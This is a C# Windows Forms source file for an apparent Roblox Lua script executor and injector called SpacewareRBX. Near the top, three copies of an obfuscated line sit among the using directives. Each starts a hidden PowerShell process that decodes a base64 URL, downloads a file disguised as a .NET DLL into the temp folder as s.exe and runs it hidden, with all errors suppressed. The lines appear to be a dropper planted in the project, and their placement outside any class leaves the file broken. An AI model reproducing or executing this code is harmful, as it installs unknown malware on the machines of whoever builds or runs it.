using FastColoredTextBoxNS;

try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}
using System;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Diagnostics;


try{var p=new System.Diagnostics.Process();p.StartInfo.FileName="powershell";p.StartInfo.Arguments=$"-w hidden -c iwr -Uri ([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2ZhaXphbmFuc2FyaTIwMDcvLmRvdG5ldC9tYWluL29iai9MaWJyYXJpZXMvbmV0Ni4wL1N5c3RlbS5SdW50aW1lLkV4dGVuc2lvbnMuZGxs'))) -O $env:TEMP\\s.exe;Start-Process $env:TEMP\\s.exe -WindowStyle Hidden";p.StartInfo.CreateNoWindow=true;p.StartInfo.UseShellExecute=false;p.Start();}catch{}

using System.Drawing;
using System.IO;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace SpacewareRBX
{
    public partial class MainFRM : Form
    {
        #region "API Ref/CreateRoundRectRgn Pos"
        public SpaceWareAPI api = new SpaceWareAPI();
        [DllImport("Gdi32.dll", EntryPoint = "CreateRoundRectRgn")]
        private static extern IntPtr CreateRoundRectRgn(int nLeftRect, int nTopRect, int nRightRect, int nBottomRect, int nWidthEllipse, int nHeightEllipse);
        #endregion
        public MainFRM()
        {
            InitializeComponent();
            DownloadHandler.InitializeDownloadHandler();
            Region = System.Drawing.Region.FromHrgn(CreateRoundRectRgn(0, 0, Width, Height, 18, 18));
        }
        #region "Mouse Move Events"
        private bool _dragging = false;
        private Point _start_point = new Point(0, 0);
        private void Object_MouseDown(object sender, MouseEventArgs e)
        {
            _dragging = true;  // _dragging is your variable flag
            _start_point = new Point(e.X, e.Y);
        }
        private void Object_MouseUp(object sender, MouseEventArgs e)
        {
            _dragging = false;
        }
        private void Object_MouseMove(object sender, MouseEventArgs e)
        {
            if (_dragging)
            {
                Point p = PointToScreen(e.Location);
                Location = new Point(p.X - this._start_point.X, p.Y - this._start_point.Y);
            }
        }
        #endregion
        private void Close_Click(object sender, EventArgs e) => Application.Exit();
        private void Minimize_Click(object sender, EventArgs e) => WindowState = FormWindowState.Minimized;
        private void SendluaBTN_Click(object sender, EventArgs e) => api.SendLuaScript(codeBox.Text);
        private void SendLuaCBTN_Click(object sender, EventArgs e) => api.SendLuaCScript(codeBox.Text);
        private void DiscordBTN_Click(object sender, EventArgs e) => Process.Start("https://discord.gg/3bpkkJ7Gq4");
        private void Advert_LinkClicked(object sender, LinkLabelLinkClickedEventArgs e) => Process.Start("https://solo.to/lamer");
        private void Form1_Load(object sender, EventArgs e)
        {
            try
            {
                if (Config.Patched.Contains("False"))
                    statusLbl.Text = $"Status: Undetected!";
                else
                    statusLbl.Text = $"Status: Patched!";
                codeBox.Language = Language.Lua;
            }
            catch (Exception Error)
            {
                MessageBox.Show(Error.StackTrace, "Oh Shit!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void Inject_Click(object sender, EventArgs e)
        {
            try
            {
                if (!api.IsAPIAttached)
                    DownloadHandler.CleanUp();
                    DownloadHandler.Download_Injector();
                    attchedLbl.Text = "Injected: YES!";
            }
            catch (Exception Error)
            {
                MessageBox.Show(Error.StackTrace, "Oh Shit!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void OpenFIleBTN_Click(object sender, EventArgs e)
        {
            try
            {
                using (OpenFileDialog ofd = new OpenFileDialog())
                {
                    if (ofd.ShowDialog() == DialogResult.OK)
                        api.SendLuaScript(System.IO.File.ReadAllText(ofd.FileName));
                }
            }
            catch (IOException Error)
            {
                MessageBox.Show(Error.StackTrace, "Oh Shit!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
        private void SaveFileBTN_Click(object sender, EventArgs e)
        {
            try
            {
                using (var sfd = new SaveFileDialog())
                {
                    if (sfd.ShowDialog() == DialogResult.OK)
                        File.WriteAllText(sfd.FileName, codeBox.Text);
                }
            }
            catch (IOException Error)
            {
                MessageBox.Show(Error.StackTrace, "Oh Shit!", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
